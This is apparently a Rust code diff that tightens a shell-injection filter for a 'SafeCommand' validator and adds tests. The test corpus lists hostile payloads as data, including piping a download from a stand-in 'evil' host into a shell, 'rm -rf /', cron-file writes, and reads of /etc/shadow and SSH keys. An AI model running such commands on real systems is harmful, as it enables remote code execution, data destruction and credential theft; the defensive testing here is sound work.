@@ -2,8 +2,59 @@ use std::collections::HashSet;
 use std::path::PathBuf;
 use std::sync::LazyLock;
 
-static FORBIDDEN_SHELL_CHARS: LazyLock<HashSet<char>> =
-    LazyLock::new(|| HashSet::from([';', '|', '&', '$', '`', '<', '>', '\n', '\r', '\0']));
+/// Characters that must never appear in a string handled by `SafeCommand`.
+///
+/// `SafeCommand` does not spawn a shell, but its arguments are sometimes
+/// copied into shell command lines by callers. #2621 requires that no single
+/// argument can change the structure of such a command line, so the set
+/// covers separators, expansions, redirection, grouping, globbing, quoting,
+/// comments and history expansion in addition to control characters.
+pub(crate) static FORBIDDEN_SHELL_CHARS: LazyLock<HashSet<char>> = LazyLock::new(|| {
+    HashSet::from([
+        // Command separators, pipelines and job control.
+        ';', '&', '|',
+        // Parameter, command and arithmetic expansion.
+        '$', '`',
+        // Redirection and here-documents.
+        '<', '>',
+        // Grouping, globbing, brace expansion, tilde and history expansion.
+        '(', ')', '{', '}', '*', '?', '[', ']', '~', '!',
+        // Quoting and comments.
+        '\'', '"', '#',
+        // Line/record separators (also caught by `char::is_control`).
+        '\n', '\r', '\0',
+    ])
+});
+
+/// Return the first shell metacharacter or control character in `value`.
+///
+/// `allow_url_separators` preserves the long-standing exception for `&`, `?`
+/// and `=` in URL query strings.
+pub(crate) fn find_forbidden_shell_char(value: &str, allow_url_separators: bool) -> Option<char> {
+    value.chars().find(|c| {
+        if allow_url_separators && matches!(c, '&' | '?' | '=') {
+            return false;
+        }
+        c.is_control() || FORBIDDEN_SHELL_CHARS.contains(c)
+    })
+}
+
+/// Like [`find_forbidden_shell_char`], but tolerates the `&&` operator used by
+/// server-constructed installer scripts (`cd <dir> && ./install.sh`). A lone
+/// `&` (background job) and `&&&` (pair plus background job) are still refused.
+pub(crate) fn find_forbidden_script_char(value: &str) -> Option<char> {
+    let mut chars = value.chars().peekable();
+    while let Some(c) = chars.next() {
+        if c == '&' && chars.peek() == Some(&'&') {
+            chars.next();
+            continue;
+        }
+        if c.is_control() || FORBIDDEN_SHELL_CHARS.contains(&c) {
+            return Some(c);
+        }
+    }
+    None
+}
 
 /// On Windows, normalise a program name for allowlist lookup: extract the
 /// file-name component, lower-case it, and strip a single trailing `.exe`.
@@ -68,16 +119,11 @@ pub fn validate_argument(arg: &str) -> Result<(), CommandGuardError> {
 
     let is_url = arg.starts_with("http://") || arg.starts_with("https://");
 
-    for c in arg.chars() {
-        if FORBIDDEN_SHELL_CHARS.contains(&c) {
-            if is_url && (c == '&' || c == '?' || c == '=') {
-                continue;
-            }
-            return Err(CommandGuardError::ShellInjectionAttempt(format!(
-                "Forbidden character '{}' in argument",
-                c.escape_default()
-            )));
-        }
+    if let Some(c) = find_forbidden_shell_char(arg, is_url) {
+        return Err(CommandGuardError::ShellInjectionAttempt(format!(
+            "Forbidden character '{}' in argument",
+            c.escape_default()
+        )));
     }
 
     let dangerous_patterns = ["$(", "`", "&&", "||", ">>", "<<", "..", "//", "\\\\"];
@@ -190,6 +236,87 @@ mod tests {
         assert!(validate_argument("test && echo").is_err());
         assert!(validate_argument("`id`").is_err());
         assert!(validate_argument("").is_err());
+    }
+
+    /// #2621 — every metacharacter must be rejected in isolation and when
+    /// embedded in an otherwise harmless argument.
+    #[test]
+    fn hostile_metacharacter_corpus_is_rejected() {
+        let corpus = [
+            "a;b", "a&b", "a|b", "a$b", "a`b", "a<b", "a>b", "a(b", "a)b",
+            "a{b", "a}b", "a*b", "a?b", "a[b", "a]b", "a~b", "a!b", "a#b",
+            "a'b", "a\"b", "a\nb", "a\rb", "a\0b", "a\tb", "a\u{1b}b",
+        ];
+        for hostile in corpus {
+            assert!(
+                validate_argument(hostile).is_err(),
+                "must refuse metacharacter in {hostile:?}"
+            );
+        }
+    }
+
+    /// Realistic injection payloads that previously slipped through because
+    /// the filter only knew about `$()`, backticks and `..`. #2621
+    #[test]
+    fn realistic_injection_payloads_are_rejected() {
+        for payload in [
+            "report.pdf; curl http://evil/x | sh",
+            "$(curl http://evil/x)",
+            "`id`",
+            "${IFS}cat${IFS}/etc/passwd",
+            "a && rm -rf /",
+            "a || rm -rf /",
+            "a > /etc/cron.d/pwn",
+            "a < /etc/shadow",
+            "a\nbad-command",
+            "a\rbad-command",
+            "a\0truncated",
+            "* /etc/shadow",
+            "? /etc/passwd",
+            "~/.ssh/id_rsa",
+            "# comment\nrm -rf /",
+            "!history",
+            "name' OR '1'='1",
+            "say \"hello\"",
+            "file(name).txt",
+            "{a,b}/secret",
+            "[abc]/secret",
+            "..%2f..%2fetc",
+        ] {
+            assert!(
+                validate_argument(payload).is_err(),
+                "must refuse injection payload {payload:?}"
+            );
+        }
+    }
+
+    /// All C0/C1 controls are refused, not only the few we can name. #2621
+    #[test]
+    fn all_control_characters_are_rejected() {
+        for code in 0u32..=0x1f {
+            if let Some(c) = char::from_u32(code) {
+                assert!(
+                    validate_argument(&format!("a{c}b")).is_err(),
+                    "control U+{code:04X} must be refused"
+                );
+            }
+        }
+        for c in ['\u{7f}', '\u{80}', '\u{9f}'] {
+            assert!(
+                validate_argument(&format!("a{c}b")).is_err(),
+                "control {c:?} must be refused"
+            );
+        }
+    }
+
+    /// The script path deliberately tolerates `&&` for server-constructed
+    /// installer scripts, but must not tolerate a bare `&` or `&&&`. #2621
+    #[test]
+    fn script_filter_allows_double_ampersand_only() {
+        assert!(find_forbidden_script_char("cd /tmp/x && ./install.sh").is_none());
+        assert_eq!(find_forbidden_script_char("echo a &"), Some('&'));
+        assert_eq!(find_forbidden_script_char("echo a &&& b"), Some('&'));
+        assert_eq!(find_forbidden_script_char("echo a; b"), Some(';'));
     }
 
     #[test]
